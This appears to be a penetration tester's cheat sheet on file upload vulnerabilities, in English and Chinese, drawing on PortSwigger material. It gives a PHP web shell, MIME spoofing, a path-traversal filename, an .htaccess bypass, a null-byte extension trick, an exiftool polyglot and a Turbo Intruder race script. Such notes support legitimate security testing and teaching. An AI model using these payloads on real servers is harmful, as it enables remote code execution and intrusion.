

File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.

In some cases, the act of uploading the file is in itself enough to cause damage. Other attacks may involve a follow-up HTTP request for the file, typically to trigger its execution by the server.

## 1. Principle

上传到服务器的文件可被远程执行

### 1.1. Location

任何可上传文件的位置都可能存在漏洞

## 2. Test

### 2.1. Web Shell

使用以下命令避免对目标造成危害

```
<?php system('whoami'); ?>
```

### 2.2. Content-Type Restriction

伪造 MIME 类型绕过校验

```
Content-Type: image/png
Content-Type: text/plain
```

### 2.3. Path Traversal

若文件上传后无法执行, 可尝试利用 Path Traversal 将文件上传到上级目录执行

```
POST /my-account/avatar HTTP/2
Host: example.com

Content-Disposition: form-data; name="avatar"; filename="../shell.php"
```

> 若返回 `The file avatars/shell.php has been uploaded.` 则需要将 `../` 编码绕过

### 2.4. Extension Blacklist

若 Apache 无法上传 PHP 文件, 可创建一个 `.htaccess` 将 `.png` 文件以 PHP 的方式解析

```
AddType application/x-httpd-php .png
```

### 2.5. Obfuscated File Extension

目标仅允许特定的扩展名, 可通过 00 截断混淆

```
filename="shell.php%00.png"
```

> `%00` 后的字符串会被置换为空

> 文件上传到服务器后, `shell.php%00.png` 会自动修改为 `shell.php` 

### 2.6. Polyglot Web Shell

目标会校验文件内容是否为图片, 可使用 exiftool 生成一个含有图片内容的 PHP 文件

```
┌──(root㉿kali)-[~]
└─# exiftool -Comment="<?php echo 'START ' . exec('whoami') . ' END'; ?>" shell.png -o shell.php
```

> 返回的内容中含有乱码, 可用 `START` 和 `END` 标注关键值

### 2.7. Race Condition

目标会在文件上传之后进行检测, 可用 Turbo Intruder 在文件被删除之前执行

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

---

**References**

- [File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [CWE-434](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-434)

